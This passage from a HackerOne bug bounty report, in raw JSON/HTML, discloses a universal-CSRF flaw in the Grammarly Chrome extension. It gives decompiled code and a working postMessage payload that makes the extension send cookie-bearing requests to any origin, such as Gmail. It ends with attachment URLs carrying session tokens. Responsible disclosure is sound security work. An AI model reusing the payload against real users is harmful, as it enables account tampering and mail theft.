class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eunrecognized\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; in runMessage \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"p-tracker-gnar\"\u003e\u003ccode\u003ep.tracker.gnar\u003c/code\u003e\u003c/h4\u003e\n\n\u003cp\u003eThat\u0026#39;s an object with next structure:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003e_batchId\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_client\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003echromeExt\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_clientVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e14.858.1756\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_containerIdManager\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003eprimaryStorage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003esecondaryStorages\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e_logger\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003e_metric\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e  \u003cspan class=\"nx\"\u003e_cacheSuccessTimeoutMillis\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e1000\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"err\"\u003e…\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_eventsUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://gnar.grammarly.com/events\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_fetch\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"err\"\u003eƒ\u003c/span\u003e \u003cspan class=\"p\"\u003e(),\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_instanceId\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003enxIwqgPE\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_isTest\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_isUserReady\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_liteUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://gnar.grammarly.com/lite\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_logger\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003egnar\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elevel\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003econtext\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eappender\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"err\"\u003eƒ\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_metric\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003egnar\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003etimersSink\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"err\"\u003eƒ\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecountersSink\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"err\"\u003eƒ\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003e_fetch\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"err\"\u003eƒ\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003e_sendTimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e7500\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"err\"\u003e…\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_queue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[],\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_storePingTimestamp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e_userId\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e701014151\n}\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAdditionally, it has a set of methods.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI guess \u003ccode\u003ep.tracker.gnar\u003c/code\u003e controls reporting telemetry events to Grammarly.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch4 id=\"attacker-controllable-function-call\"\u003eAttacker-controllable function call\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etracker\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egnar\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etracker\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egnar\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003eapply\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003es\u003c/code\u003e = that\u0026#39;s the second part of command\u0026#39;s \u0026quot;method\u0026quot; field. E.g. \u003ccode\u003e\u0026quot;method\u0026quot;: \u0026quot;hello.grammarly\u0026quot;\u003c/code\u003e -\u0026gt; s = \u0026#39;grammarly\u0026#39;\u003cbr\u003e\n\u003ccode\u003et\u003c/code\u003e = \u003ccode\u003eparams\u003c/code\u003e and \u003ccode\u003eprops\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThis snippet could be rewritten as:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eGNAR\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003emethodsMethod\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003eapply\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eGNAR\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e  \u003cspan class=\"nx\"\u003etoArray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparamsAndProps\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"p-tracker-gnars-constructor-and-methods\"\u003e\n\u003ccode\u003ep.tracker.gnar\u003c/code\u003es \u003ccode\u003e.constructor\u003c/code\u003e and methods\u003c/h4\u003e\n\n\u003cp\u003e\u003ccode\u003ep.tracker.gnar\u003c/code\u003e object could be overwritten using \u003ccode\u003e.constructor\u003c/code\u003e  and \u003ccode\u003e.setUser\u003c/code\u003e methods those allow changing some \u003ccode\u003ep.tracker.gnar\u003c/code\u003e properties. \u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ep.tracker.gnar\u003c/code\u003es \u003ccode\u003e.constructor\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efunction e(e, t, n, r, o, i, c, s) { // Attacker controls e and t params + non-listed params using `setUser`\n            void 0 === s \u0026amp;\u0026amp; (s = !1),\n            this._client = t,\n            this._clientVersion = n,\n            this._fetch = r,\n            this._containerIdManager = o,\n            this._logger = i,\n            this._metric = c,\n            this._storePingTimestamp = s,\n            this._instanceId = a.alphanumeric(8),\n            this._batchId = 0,\n            this._isUserReady = !1,\n            this._queue = [],\n            this._eventsUrl = e + \u0026quot;/events\u0026quot;,\n            this._liteUrl = e + \u0026quot;/lite\u0026quot;,\n            this._pingMaybe()\n        }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch5 id=\"gnar-setuser-gnar-_execqueue-gnar-_send-gnar-_dosend-gnar-_enqueue\"\u003e\n\u003ccode\u003egnar.setUser\u003c/code\u003e/\u003ccode\u003egnar._execQueue\u003c/code\u003e / \u003ccode\u003egnar._send\u003c/code\u003e / \u003ccode\u003egnar._doSend\u003c/code\u003e / \u003ccode\u003egnar._enqueue\u003c/code\u003e\n\u003c/h5\u003e\n\n\u003cp\u003e\u003ccode\u003ep.tracker.gnar\u003c/code\u003e has a set of interesting methods like \u003ccode\u003esetUser\u003c/code\u003e. Grammarly extension uses \u003ccode\u003esetUser\u003c/code\u003e to invalidate session. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003esession-invalidate\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003egnar.setUser\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI\u0026#39;m not sure, but looks like calling this method with crafted payload may lead to incorrect userId in telemetry. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eTeam probably should know how much powerful listed above funcstions are. \u003c/p\u003e\n\n\u003ch4 id=\"_fetch\"\u003e\u003ccode\u003e_fetch\u003c/code\u003e\u003c/h4\u003e\n\n\u003cp\u003e\u003ccode\u003ep.tracker.gnar\u003c/code\u003e has \u003ccode\u003e_fetch\u003c/code\u003e property which points to \u003ccode\u003efetch\u003c/code\u003e function.\u003cbr\u003e\nMore interesting is that, it\u0026#39;s a polyfill, not a native function.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI guess this polyfill isn\u0026#39;t compliable to WHATWG fetch, because it allows making requests to \u003ccode\u003edata:/chrome-extension:/\u003c/code\u003e origins.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThat means, it\u0026#39;s possible to call \u003ccode\u003efetch()\u003c/code\u003e with attacker\u0026#39;s params from the extension.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ep.tracker.gnar_fetch.apply(p.tracker.gnar, [\u0026quot;FetchURL\u0026quot;, \u0026quot;FetchParams\u0026quot;])\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePage has to call \u003ccode\u003ewindow.postMessage\u003c/code\u003e with next object to call \u003ccode\u003efetch\u003c/code\u003e from the extension\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex = window.top.postMessage({\n    grammarly: true,\n    action: \u0026#39;tracking\u0026#39;,\n    method: \u0026#39;gnar._fetch\u0026#39;,\n    props: { // FetchParams\n        method: \u0026#39;GET\u0026#39;,\n        headers: {\n            \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;\n        }\n    },\n    param: \u0026#39;https://mail.google.com/mail/u/0/#inbox\u0026#39; // \u0026lt;FetchURL\u0026gt;\n}, \u0026quot;*\u0026quot;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"xhr-cookies\"\u003eXHR + cookies\u003c/h4\u003e\n\n\u003cp\u003eGrammarly extension has permissions to access all URLs and cookies from all origins. \u003cbr\u003e\nGrammarly makes all XHR requests with cookies -\u0026gt; it\u0026#39;s possible for attacker to make blind requests with cookies to any origin.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e(except \u003ccode\u003echrome://\u003c/code\u003e, however, \u003ccode\u003echrome-extension://\u003c/code\u003e is allowed because of polyfill for \u003ccode\u003efetch\u003c/code\u003e).\u003c/p\u003e\n\n\u003cp\u003eMore details in \u0026quot;Impact\u0026quot; section.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"browsers-verified-in\"\u003eBrowsers Verified In:\u003c/h2\u003e\n\n\u003cp\u003eChrome 70.0.3508.0 Canary\u003cbr\u003e\nChrome 68.0.3440.75 Stable\u003cbr\u003e\nGrammarly: 14.858.1756\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003ch3 id=\"change-user-s-name-in-grammarly\"\u003eChange user\u0026#39;s name in Grammarly\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eOpen \u003ccode\u003eapp-grammarly-csfr.html\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003ePage makes request to \u003ccode\u003ehttps://auth.grammarly.com/v3/user\u003c/code\u003e to change your name to \u0026quot;Anonymous User\u0026quot; \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"get-gmail-as-proof\"\u003eGET Gmail as proof\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eOpen Grammarly extension debug page in Chrome\u003c/li\u003e\n\u003cli\u003eOpen \u003ccode\u003eget-request-to-gmail.html\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eOpen \u0026quot;Network\u0026quot; tab in the debug page\u003c/li\u003e\n\u003cli\u003eNote that extension made a GET request to Gmail (with cookies)\u003c/li\u003e\n\u003cli\u003eOpen request preview\u003c/li\u003e\n\u003cli\u003eNote that request includes your gmail content\u003c/li\u003e\n\u003cli\u003e That means, it\u0026#39;s possible to initiate requests with cookies to any origin. Web applications without \u0026quot;direct CSRF protection\u0026quot; (e.g. \u003ccode\u003ehidden\u003c/code\u003e field with some value, not token in cookies ) are controllable by attacker.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eScreencast for POST to\u003ccode\u003ehttps://auth.grammarly.com/v3/user\u003c/code\u003e. [1st PoC]\u003c/li\u003e\n\u003cli\u003eScreencast to prove that Grammarly makes requests with cookies to cross-origin domains. [2nd PoC] \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI didn\u0026#39;t know a good CSRF target, so I\u0026#39;ve recorded a second screencast with Gmail and GET request. I think that\u0026#39;s enough to prove the vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003ch2 id=\"universal-csrf\"\u003eUniversal CSRF\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eActually, \u0026quot;Universal CSRF\u0026quot; isn\u0026#39;t a correct definition 😉. But I think it correctly expresses impact of the vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAttacker could trigger Grammarly extension\u0026#39;s \u003ccode\u003egnar._fetch\u003c/code\u003e command  using crafted page to perform XHR with any configurational params to any origin [without user gesture]. \u003c/p\u003e\n\n\u003cp\u003eWeb applications without good protection against CSRF (\u003ccode\u003ehidden\u003c/code\u003e field in form, not cookies/origin check/etc.) are vulnerable to CSRF. \u003c/p\u003e\n\n\u003cp\u003ePage could made \u003cstrong\u003eany number of blind requests through Grammarly extension with cookies\u003c/strong\u003e. \u003c/p\u003e\n\n\u003ch2 id=\"overwrite-p-tracker-gnar-and-call-any-method-of-this-object\"\u003eOverwrite \u003ccode\u003ep.tracker.gnar\u003c/code\u003e and call any method of this object\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003ep.tracker.gnar\u003c/code\u003e has a set of interesting methods like \u003ccode\u003esetUser\u003c/code\u003e. Grammarly extension uses \u003ccode\u003esetUser\u003c/code\u003e to invalidate session.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI assume, calling this methods leads to sending invalid telemetry data to Grammarly.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"possible-uxss-via-data-manipulation\"\u003ePossible UXSS via data manipulation\u003c/h2\u003e\n\n\u003cp\u003eAttacker could overwrite \u003ccode\u003ep.tracker.gnar\u003c/code\u003e with arbitrary data. However, \u003ccode\u003epostMessage\u003c/code\u003e doesn\u0026#39;t allow to send \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FWeb_Workers_API%2FStructured_clone_algorithm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003enon-clonable objects\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eAttacker could call something like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eAnythingClonable.apply(Object, [AnythingClonable])\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI didn\u0026#39;t test this with \u003ccode\u003eFile/Blob/FileList\u003c/code\u003e non-clonnable objects. However, I think it\u0026#39;s not possible to turn the snippet above into XSS.\u003c/p\u003e\n\n\u003cp\u003eP.S: Grammarly, sorry for typos/mistakes if any. Your extension has some bugs at \u003ccode\u003ehackerone.com\u003c/code\u003e domain.\u003c/p\u003e\n\u003c/blockquote\u003e\n","bounty_amount":"3000.0","formatted_bounty":"$3,000","original_report_id":null,"original_report_url":null,"attachments":[{"id":327032,"file_name":"grammarly-ucsrf-username.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/032/467b124971903936f000ca14379c97eddc0d9b1a/grammarly-ucsrf-username.mp4?response-content-disposition=attachment%3B%20filename%3D%22grammarly-ucsrf-username.mp4%22%3B%20filename%2A%3DUTF-8%27%27grammarly-ucsrf-username.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054853Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=fe8693c2b439268923f19a34e9088b97fd575c44d06969990598fd10c4f8d1f9","file_size":843252,"type":"video/mp4"},{"id":327034,"file_name":"grammarly-gmail-get-as-proof.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/034/33c5d7b689653dd16536ca9f4d84e73fc317c5ab/grammarly-gmail-get-as-proof.mp4?response-content-disposition=attachment%3B%20filename%3D%22grammarly-gmail-get-as-proof.mp4%22%3B%20filename%2A%3DUTF-8%27%27grammarly-gmail-get-as-proof.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054853Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2Bp